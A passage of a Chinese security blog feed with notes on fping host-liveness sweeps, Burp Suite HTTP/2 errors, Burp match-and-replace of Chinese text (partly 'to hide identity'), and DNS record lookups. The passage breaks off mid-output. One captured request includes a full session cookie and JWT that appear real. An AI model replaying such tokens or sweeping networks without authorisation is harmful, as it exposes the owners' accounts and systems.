    <link href="/2024/02/19/security/sectools/fping/"/>
    <url>/2024/02/19/security/sectools/fping/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>日常工作过程中，需要批量探测部分IP是否存活</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>send ICMP ECHO_REQUEST packets to network hosts</p><p>通过发送 ICMP 数据包进行探测存活</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h2><p>brew install fping </p><h2 id="RedHat"><a href="#RedHat" class="headerlink" title="RedHat"></a>RedHat</h2><p>yum install fping </p><p>dnf install fping</p><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>apt install fping</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>fping 选项 语法</p><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h3><p>显示活动主机列表</p><h3 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h3><p>显示不可达主机列表</p><h3 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h3><p>制定CIDR地址或者IP地址范围</p><h3 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h3><p>从文件中读取要扫描的IP地址列表</p><h3 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h3><p>设置超时时间（等待响应的最大时间），默认 500ms</p><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><p>设置重试次数，默认 3 次</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>启用统计信息</p><h3 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h3><p>只显示有响应的IP地址，不显示错误信息</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="探测单个IP地址存活性"><a href="#探测单个IP地址存活性" class="headerlink" title="探测单个IP地址存活性"></a>探测单个IP地址存活性</h2><p>fping 10.191.5.21</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping <span class="hljs-number">10</span>.<span class="hljs-number">191</span>.<span class="hljs-number">5</span>.<span class="hljs-number">21</span><br><span class="hljs-number">10.191.5.21</span> is unreachable<br></code></pre></td></tr></table></figure><h2 id="探测文件列表中IP地址存活性"><a href="#探测文件列表中IP地址存活性" class="headerlink" title="探测文件列表中IP地址存活性"></a>探测文件列表中IP地址存活性</h2><p>fping -f iplist.txt</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping -f iplist.txt<br><span class="hljs-number">10.182.14.148</span> is alive<br><span class="hljs-number">10.191.5.21</span> is unreachable<br><span class="hljs-number">10.191.5.22</span> is unreachable<br></code></pre></td></tr></table></figure><h2 id="只显示存活主机列表"><a href="#只显示存活主机列表" class="headerlink" title="只显示存活主机列表"></a>只显示存活主机列表</h2><p>fping -a -f iplist.txt</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping -f iplist.txt -a<br><span class="hljs-number">10.182.14.148</span><br></code></pre></td></tr></table></figure><h2 id="探测局域网CIDR内存活主机"><a href="#探测局域网CIDR内存活主机" class="headerlink" title="探测局域网CIDR内存活主机"></a>探测局域网CIDR内存活主机</h2><p>fping -a -g ip端</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root@iZbp1191gh7vw52537lyxrZ:~# fping -a -g <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">24</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">172.16.24.136</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite_http2</title>
    <link href="/2024/02/19/security/sectools/burpsuite/burpsuite_http2/"/>
    <url>/2024/02/19/security/sectools/burpsuite/burpsuite_http2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用 burpsuite 测试过程中遇到 dashboard中的一些 event log ，对部分错误日志分析记录</p><h2 id="报错及解决方案"><a href="#报错及解决方案" class="headerlink" title="报错及解决方案"></a>报错及解决方案</h2><p>报错均 基于burp suite 2021.10.3版本 </p><h3 id="error-suite-Communication-error-domain"><a href="#error-suite-Communication-error-domain" class="headerlink" title="error-suite-Communication error:domain"></a>error-suite-Communication error:domain</h3><h4 id="报错现象"><a href="#报错现象" class="headerlink" title="报错现象"></a>报错现象</h4><p>suite：Communication error:domain</p><p>Repeater：Server ALPN does not advertise HTTP&#x2F;2 support.You can force HTTP&#x2F;2 from the Repeater menu</p><h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当前版本支持 HTTP&#x2F;2，但是会存在部分请求不支持HTTP&#x2F;2，就会报Server ALPN does not advertise HTTP&#x2F;2 support.You can force HTTP&#x2F;2 from the Repeater menu错，可在INSPECTOR中进行协议切换</p><p>在 Project options -&gt; HTTP -&gt; HTTP&#x2F;2有勾选，如果服务支持将默认使用 HTTP&#x2F;2</p><p>Repeater</p><p>请求默认使用 HTTP&#x2F;2协议</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>默认服务都会支持 HTTP&#x2F;1 协议，为避免报错信息，可以将 HTTP&#x2F;2关闭掉</p><h3 id="No-response-received-from-remote-server"><a href="#No-response-received-from-remote-server" class="headerlink" title="No response received from remote server"></a>No response received from remote server</h3><h4 id="报错现象-1"><a href="#报错现象-1" class="headerlink" title="报错现象"></a>报错现象</h4><p>dashboard 中 event log No response received from remote server</p><h4 id="报错原因-1"><a href="#报错原因-1" class="headerlink" title="报错原因"></a>报错原因</h4><p>新版本burpsuite默认支持http2，如果遇到不支持的站点，就会报错</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>1、proxy-&gt;options-&gt;Miscellaneous 勾选使用http&#x2F;1.0进行通信，默认不勾选</p><p>2、Project options-&gt;HTTP-&gt;HTTP&#x2F;2取消勾选默认HTTP&#x2F;2的选项</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>proxy_match_replace_chinese</title>
    <link href="/2024/02/06/security/sectools/burpsuite/proxy_match_replace_chinese/"/>
    <url>/2024/02/06/security/sectools/burpsuite/proxy_match_replace_chinese/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用 burpsuite 测试过程中Proxy模块需要将数据包中的中文字符匹配验证或者匹配替换，用于验证漏洞或者隐藏身份</p><p>例如：将请求中的“信息安全”替换掉</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v1/log</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aidesign.test.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Apache=5867067965663.845.1707120756994; _ut=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoiaGFpbmluZzMiLCJuaWNrIjoi5L2Z5rW35a6BIiwicm9sZXMiOnt9LCJvcmdhbml6YXRpb24iOlsi5L-h5oGv5a6J5YWoIl0sIm9yZ2FuaXphdGlvbnQzIjpbIuaWsOa1qumbhuWbol_lvq7ljZpf5b6u5Y2aQ09P57uE57uHIl0sImlwIjoiMTAuMjIyLjI4LjUiLCJ0aWNrZXQiOiJTVC0xMDQxOTg1LXB3RHlpZmFYM20xZjZhcmlZTnVVIiwic2VydmljZSI6Imh0dHAlM0ElMkYlMkZpLmZlLnNpbmEuY24lMkZ2ZXJpZnklMkZhdXRoJTNGYmFja3VybCUzRGh0dHAlMjUzQSUyNTJGJTI1MkZhaWRlc2lnbi53ZWliby5jb20lMjUyRiIsImxvZ2luVGltZSI6MTcwNzEyMDc3NDE2MH0sImlhdCI6MTcwNzEyMDc3NCwiZXhwIjoxNzA3MjA3MTc0fQ.G5OAkK1kN3-jCqY5728OtGlEmcF37of6YZfxep--Meg<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json,  */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>238<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://aidesign.test.com<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://aidesign.test.com/<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;report&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;_exposure&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;ek&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;promptcreator&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;et&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;promptcreator&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pk&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;187522&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ts&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1707120897000</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dept&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test_信息安全&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;image&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;home&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;uid&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><h2 id="自动匹配解决方案"><a href="#自动匹配解决方案" class="headerlink" title="自动匹配解决方案"></a>自动匹配解决方案</h2><h3 id="匹配验证解决方案"><a href="#匹配验证解决方案" class="headerlink" title="匹配验证解决方案"></a>匹配验证解决方案</h3><p>将要匹配的中文转换为十六进制\x格式（大小写不影响），使用正则 Regex 匹配</p><p>中文转换为十六进制可以使用线上工具转换，也可以直接从请求包Hex格式中提取，提取的格式增加0x即可</p><p>例如：</p><p>字符串：信息安全  </p><p>十六进制：E4 BF A1 E6 81 AF E5 AE 89 E5 85 A8  \xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8</p><h3 id="匹配替换解决方案"><a href="#匹配替换解决方案" class="headerlink" title="匹配替换解决方案"></a>匹配替换解决方案</h3><h4 id="中文替换为中文（未验证成功）"><a href="#中文替换为中文（未验证成功）" class="headerlink" title="中文替换为中文（未验证成功）"></a>中文替换为中文（未验证成功）</h4><p>测试过程中发现如果要将中文替换为中文，使用十六进制格式可以匹配到，但是替换不了</p><p>信息安全-&gt;总裁办</p><p>失败的测试过程：</p><p>1、替换字符转为十六进制</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;\xE6\x80\xBB\xE8\xA3\x81\xE5\x8A\x9E</p><p>现象：</p><p>burpsuite 请求“信息安全”字段直接替换为十六进制字符串\xE6\x80\xBB\xE8\xA3\x81\xE5\x8A\x9E</p><p>2、替换字符转为unicode字符</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;\u603b\u88c1\u529e</p><p>现象：</p><p>burpsuite 请求“信息安全”字段替换为去除\的字符串u603bu88c1u529e</p><p>3、替换字符直接设置为中文</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;总裁办</p><p>现象：</p><p>burpsuite 请求“信息安全”字段被替换为乱码字符，查看hex值发现乱码字符为 3B C1</p><h4 id="中文替换为非中文"><a href="#中文替换为非中文" class="headerlink" title="中文替换为非中文"></a>中文替换为非中文</h4><p>中文替换为英文、数字等，只需要将匹配的中文转换为十六进制\x格式，英文和数字等不需要转换</p><p>信息安全-&gt;test</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;test</p><h2 id="手动匹配解决方案"><a href="#手动匹配解决方案" class="headerlink" title="手动匹配解决方案"></a>手动匹配解决方案</h2><p>匹配替换，无论是替换为中文还是非中文字符，拦截直接修改为对应字符就行</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] http替换内容为中文的解决方案 Mi_Bo 2018-05-18 16:54:56<br>链接：<a href="https://blog.csdn.net/Mi_Bo/article/details/80366592">https://blog.csdn.net/Mi_Bo/article/details/80366592</a><br>[2] Match and Replace does not seem to work correctly with CJK characters Jackpot Sep 07, 2023 12:24PM UTC<br><a href="https://forum.portswigger.net/thread/match-and-replace-does-not-seem-to-work-correctly-with-cjk-characters-89ec4112">https://forum.portswigger.net/thread/match-and-replace-does-not-seem-to-work-correctly-with-cjk-characters-89ec4112</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dnsip</title>
    <link href="/2024/02/06/network/dns/dnsip/"/>
    <url>/2024/02/06/network/dns/dnsip/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>记录常用的 DNS IP，便于使用配置</p><h2 id="阿里云DNS"><a href="#阿里云DNS" class="headerlink" title="阿里云DNS"></a>阿里云DNS</h2><p>nameserver 223.5.5.5<br>nameserver 223.6.6.6<br>nameserver 2400:3200::1<br>nameserver 2400:3200:baba::1</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] 阿里云公共DNS<br><a href="https://alidns.com/">https://alidns.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>dns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dns_record_operation</title>
    <link href="/2024/02/06/network/dns/dns_record_operation/"/>
    <url>/2024/02/06/network/dns/dns_record_operation/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>对常见的DNS记录及操作学习总结</p><h1 id="常见DNS记录"><a href="#常见DNS记录" class="headerlink" title="常见DNS记录"></a>常见DNS记录</h1><h2 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>主机名称，域名对应的IPv4地址</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-domain"><a href="#nslookup-domain" class="headerlink" title="nslookup domain"></a>nslookup domain</h5><p>nslookup 不指定参数，默认查询A记录</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">~</span> <span class="hljs-string">nslookup</span> <span class="hljs-string">baidu.com</span><br><span class="hljs-attr">Server:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02</span><br><span class="hljs-attr">Address:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02#53</span><br><br><span class="hljs-attr">Non-authoritative answer:</span><br><span class="hljs-attr">Name:</span><span class="hljs-string">baidu.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">39.156</span><span class="hljs-number">.66</span><span class="hljs-number">.10</span><br><span class="hljs-attr">Name:</span><span class="hljs-string">baidu.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">110.242</span><span class="hljs-number">.68</span><span class="hljs-number">.66</span><br></code></pre></td></tr></table></figure><h5 id="host-t-A-domain"><a href="#host-t-A-domain" class="headerlink" title="host -t A domain"></a>host -t A domain</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">➜  ~ host -t A <span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">baidu.com </span>has <span class="hljs-keyword">address </span><span class="hljs-number">39</span>.<span class="hljs-number">156</span>.<span class="hljs-number">66</span>.<span class="hljs-number">10</span><br><span class="hljs-keyword">baidu.com </span>has <span class="hljs-keyword">address </span><span class="hljs-number">110</span>.<span class="hljs-number">242</span>.<span class="hljs-number">68</span>.<span class="hljs-number">66</span><br></code></pre></td></tr></table></figure><h2 id="AAAA记录"><a href="#AAAA记录" class="headerlink" title="AAAA记录"></a>AAAA记录</h2><p>IPv6版本的A记录，域名对应的IPv6地址</p><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><h4 id="查询-1"><a href="#查询-1" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-type-AAAA-domain"><a href="#nslookup-type-AAAA-domain" class="headerlink" title="nslookup -type&#x3D;AAAA domain"></a>nslookup -type&#x3D;AAAA domain</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  ~ nslookup -<span class="hljs-built_in">type</span>=AAAA www.weibo.<span class="hljs-keyword">cn</span> <br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>www.weibo.<span class="hljs-keyword">cn</span>canonical name = weibo.<span class="hljs-keyword">cn</span>.<br>weibo.<span class="hljs-keyword">cn</span><span class="hljs-built_in">has</span> AAAA address <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1023</span>:<span class="hljs-number">3</span>::<span class="hljs-number">20</span><br>weibo.<span class="hljs-keyword">cn</span><span class="hljs-built_in">has</span> AAAA address <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">17</span><br>weibo.<span class="hljs-keyword">cn</span><span class="hljs-built_in">has</span> AAAA address <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">18</span><br><br>Authoritative answers can <span class="hljs-keyword">be</span> found from:<br></code></pre></td></tr></table></figure><h5 id="host-t-AAAA-domain"><a href="#host-t-AAAA-domain" class="headerlink" title="host -t AAAA domain"></a>host -t AAAA domain</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -t AAAA www<span class="hljs-selector-class">.weibo</span><span class="hljs-selector-class">.cn</span><br>www<span class="hljs-selector-class">.weibo</span><span class="hljs-selector-class">.cn</span> is an alias <span class="hljs-keyword">for</span> weibo<span class="hljs-selector-class">.cn</span>.<br>weibo<span class="hljs-selector-class">.cn</span> has IPv6 <span class="hljs-selector-tag">address</span> <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">17</span><br>weibo<span class="hljs-selector-class">.cn</span> has IPv6 <span class="hljs-selector-tag">address</span> <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1023</span>:<span class="hljs-number">3</span>::<span class="hljs-number">20</span><br>weibo<span class="hljs-selector-class">.cn</span> has IPv6 <span class="hljs-selector-tag">address</span> <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h2 id="NS记录"><a href="#NS记录" class="headerlink" title="NS记录"></a>NS记录</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>域名服务器记录，也就是该记录指定由那台域名服务器解析域名</p><h3 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h3><h4 id="查询-2"><a href="#查询-2" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-type-NS-domain"><a href="#nslookup-type-NS-domain" class="headerlink" title="nslookup -type&#x3D;NS domain"></a>nslookup -type&#x3D;NS domain</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ nslookup -type=NS baidu<span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns3<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns4<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns7<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns2<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br><br>Authoritative answers can be found from:<br></code></pre></td></tr></table></figure><h5 id="host-t-NS-domain"><a href="#host-t-NS-domain" class="headerlink" title="host -t NS domain"></a>host -t NS domain</h5><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p>NS记录依赖于A记录的解析，要设置NS记录，首先需要给NS记录创建A记录</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">~</span> <span class="hljs-string">nslookup</span> <span class="hljs-string">ns3.baidu.com</span><br><span class="hljs-attr">Server:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02</span><br><span class="hljs-attr">Address:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02#53</span><br><br><span class="hljs-attr">Non-authoritative answer:</span><br><span class="hljs-attr">Name:</span><span class="hljs-string">ns3.baidu.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">112.80</span><span class="hljs-number">.248</span><span class="hljs-number">.64</span><br></code></pre></td></tr></table></figure><h2 id="SOA记录"><a href="#SOA记录" class="headerlink" title="SOA记录"></a>SOA记录</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>起始授权记录，用于指定NS记录中主DNS服务器</p><p>“起始授权记录，用于一个区域的开始，SOA记录后的所有信息均是用于控制这个区域的，每个区域数据库文件都必须包含一个SOA记录，并且必须是其中的第一个资源记录，用以标识DNS服务器管理的起始位置，SOA说明能解析这个区域的dns服务器中哪个是主服务器<br>例如，NS记录说明了有两个DNS服务器负责baidu.com的域名解析，但哪个是主服务器呢？这个任务由SOA记录来完成”</p><h3 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h3><h4 id="查询-3"><a href="#查询-3" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-type-SOA-domain"><a href="#nslookup-type-SOA-domain" class="headerlink" title="nslookup -type&#x3D;SOA domain"></a>nslookup -type&#x3D;SOA domain</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">➜  ~ nslookup -type=SOA <span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">Server:</span><span class="hljs-number">10</span>.<span class="hljs-number">211</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br><span class="hljs-keyword">Address:</span><span class="hljs-number">10</span>.<span class="hljs-number">211</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><span class="hljs-comment">#53</span><br><br><span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">origin </span>= dns.<span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span>mail <span class="hljs-keyword">addr </span>= sa.<span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span>serial = <span class="hljs-number">2012145588</span><br>refresh = <span class="hljs-number">300</span><br>retry = <span class="hljs-number">300</span><br>expire = <span 